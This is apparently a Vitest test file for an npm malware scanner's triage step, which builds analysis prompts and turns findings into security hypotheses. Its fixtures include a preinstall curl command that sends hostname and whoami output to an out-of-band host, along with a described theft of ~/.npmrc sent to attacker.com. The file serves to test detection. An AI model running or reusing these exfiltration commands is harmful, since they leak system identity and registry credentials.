import { describe, it, expect } from "vitest";
import { Hypothesis } from "@npmguard/shared";
import { buildMapPrompt, draftToHypothesis, MAP_SYSTEM, synthesizeInventoryHypotheses } from "./triage.js";
import type { PackageIntent } from "./intent-extraction.js";
import type { InventoryReport } from "../models.js";

const intent: PackageIntent = {
  statedPurpose: "Parses CSV files into JSON.",
  expectedCapabilities: ["FILESYSTEM"],
  rationale: "CSV parsing reads files; no network or env access is necessary.",
};

// ---------------------------------------------------------------------------
// buildMapPrompt
// ---------------------------------------------------------------------------

describe("buildMapPrompt", () => {
  it("includes the package intent so MAP can reason about capability mismatch", () => {
    const prompt = buildMapPrompt({
      fileName: "index.js",
      contents: "console.log('x');",
      fileFlags: [],
      intent,
    });
    expect(prompt).toContain("Parses CSV files into JSON.");
    expect(prompt).toContain("expectedCapabilities: FILESYSTEM");
    expect(prompt).toContain("CSV parsing reads files");
  });

  it("numbers file lines so MAP can return stable ranges", () => {
    const prompt = buildMapPrompt({
      fileName: "a.js",
      contents: "alpha\nbeta\ngamma",
      fileFlags: [],
      intent,
    });
    expect(prompt).toContain("1: alpha");
    expect(prompt).toContain("2: beta");
    expect(prompt).toContain("3: gamma");
  });

  it("includes structural flags when provided", () => {
    const prompt = buildMapPrompt({
      fileName: "lib.js",
      contents: "x",
      fileFlags: ["[warn] eval-present: eval() used"],
      intent,
    });
    expect(prompt).toContain("## Structural flags for this file");
    expect(prompt).toContain("eval-present");
  });

  it("omits the flags section when none are given", () => {
    const prompt = buildMapPrompt({
      fileName: "lib.js",
      contents: "x",
      fileFlags: [],
      intent,
    });
    expect(prompt).not.toContain("## Structural flags");
  });

  it("renders an empty expectedCapabilities list with a clear marker", () => {
    const prompt = buildMapPrompt({
      fileName: "lib.js",
      contents: "x",
      fileFlags: [],
      intent: { ...intent, expectedCapabilities: [] },
    });
    expect(prompt).toContain("expectedCapabilities: (none");
  });
});

describe("MAP_SYSTEM", () => {
  it("instructs the model to emit zero hypotheses for boring code", () => {
    expect(MAP_SYSTEM).toContain("Return zero hypotheses if the file is boring utility code.");
  });

  it("includes the capability mismatch rule", () => {
    expect(MAP_SYSTEM.toLowerCase()).toContain("capability");
    expect(MAP_SYSTEM.toLowerCase()).toContain("mismatch");
  });
});

// ---------------------------------------------------------------------------
// draftToHypothesis
// ---------------------------------------------------------------------------

describe("draftToHypothesis", () => {
  const now = "2026-04-24T12:00:00.000Z";

  it("produces a valid Hypothesis with scaffolded defaults", () => {
    const h = draftToHypothesis({
      draft: {
        description: "reads ~/.npmrc and POSTs it to attacker.com",
        claim: { kind: "env_exfil", gating: null },
        severity: "high",
        rangesInFile: ["42-67"],
      },
      file: "lib/setup.js",
      hypId: "trg-0001",
      now,
    });

    expect(Hypothesis.parse(h)).toEqual(h); // schema-valid
    expect(h.hypId).toBe("trg-0001");
    expect(h.state).toBe("OPEN");
    expect(h.createdBy).toBe("triage");
    expect(h.focusFiles).toEqual(["lib/setup.js"]);
    expect(h.focusLines).toEqual([{ file: "lib/setup.js", range: "42-67" }]);
    expect(h.evidenceRefs).toEqual([]);
    expect(h.parentHypId).toBeNull();
    expect(h.childHypIds).toEqual([]);
    expect(h.resolvedAt).toBeNull();
    expect(h.resolution).toBeNull();
    expect(h.createdAt).toBe(now);
  });

  it("creates one focusLine per range in rangesInFile", () => {
    const h = draftToHypothesis({
      draft: {
        description: "scattered obfuscation",
        claim: { kind: "obfuscation", gating: null },
        severity: "medium",
        rangesInFile: ["12-30", "55-80", "120-125"],
      },
      file: "dist/bundle.js",
      hypId: "trg-0002",
      now,
    });
    expect(h.focusLines).toEqual([
      { file: "dist/bundle.js", range: "12-30" },
      { file: "dist/bundle.js", range: "55-80" },
      { file: "dist/bundle.js", range: "120-125" },
    ]);
  });

  it("preserves gating modifier when provided", () => {
    const h = draftToHypothesis({
      draft: {
        description: "runs only under CI env",
        claim: { kind: "env_exfil", gating: "ci_gate" },
        severity: "high",
        rangesInFile: ["10-20"],
      },
      file: "setup.js",
      hypId: "trg-0003",
      now,
    });
    expect(h.claim.gating).toBe("ci_gate");
  });

  it("defaults gating to null when undefined", () => {
    const h = draftToHypothesis({
      draft: {
        description: "x",
        claim: { kind: "telemetry", gating: null },
        severity: "low",
        rangesInFile: ["1-1"],
      },
      file: "a.js",
      hypId: "trg-0004",
      now,
    });
    expect(h.claim.gating).toBeNull();
  });
});

describe("synthesizeInventoryHypotheses", () => {
  const baseInventory: InventoryReport = {
    metadata: {
      name: "fixture",
      version: "1.0.0",
      description: null,
      license: null,
      homepage: null,
      keywords: [],
      repository: null,
    },
    scripts: {},
    entryPoints: { install: [], runtime: ["index.js"], bin: [] },
    dependencies: { prod: {}, dev: {}, optional: {}, peer: {} },
    files: [],
    flags: [],
    dealbreaker: null,
  };

  it("turns suspicious shell lifecycle network exfil into a critical hypothesis", () => {
    const hyps = synthesizeInventoryHypotheses({
      packagePath: "/tmp/does-not-matter",
      now: "2026-04-24T12:00:00.000Z",
      startCounter: 2,
      inventory: {
        ...baseInventory,
        flags: [
          {
            severity: "warn",
            check: "non-node-script",
            detail:
              "Lifecycle script 'preinstall' is not a node command: curl --data-urlencode \"info=$(hostname && whoami)\" aejxvzefqctwzcphkyqmwdl8zymn15ebx.oast.fun",
            file: null,
          },
        ],
      },
    });

    expect(hyps).toHaveLength(1);
    expect(hyps[0]!.hypId).toBe("trg-0003");
    expect(hyps[0]!.claim.kind).toBe("env_exfil");
    expect(hyps[0]!.severity).toBe("critical");
    expect(hyps[0]!.focusFiles).toEqual(["package.json"]);
    expect(hyps[0]!.createdBy).toBe("inventory");
  });

  it("ignores benign non-node lifecycle scripts without network exfil shape", () => {
    const hyps = synthesizeInventoryHypotheses({
      packagePath: "/tmp/does-not-matter",
      now: "2026-04-24T12:00:00.000Z",
      startCounter: 0,
      inventory: {
        ...baseInventory,
        flags: [
          {
            severity: "warn",
            check: "non-node-script",
            detail: "Lifecycle script 'postinstall' is not a node command: echo done",
            file: null,
          },
        ],
      },
    });

    expect(hyps).toEqual([]);
  });

  it("turns HTTP dependency URLs into a high-risk supply-chain hypothesis", () => {
    const hyps = synthesizeInventoryHypotheses({
      packagePath: "/tmp/does-not-matter",
      now: "2026-04-24T12:00:00.000Z",
      startCounter: 0,
      inventory: {
        ...baseInventory,
        flags: [
          {
            severity: "warn",
            check: "dependency-url",
            detail:
              "prod dependency 'ui-styles-pkg' uses URL specifier: http://packages.storeartifact.com/npm/badgekit-api-client",
            file: "package.json",
          },
        ],
      },
    });

    expect(hyps).toHaveLength(1);
    expect(hyps[0]!.claim.kind).toBe("binary_drop");
    expect(hyps[0]!.severity).toBe("high");
    expect(hyps[0]!.focusFiles).toEqual(["package.json"]);
  });
});
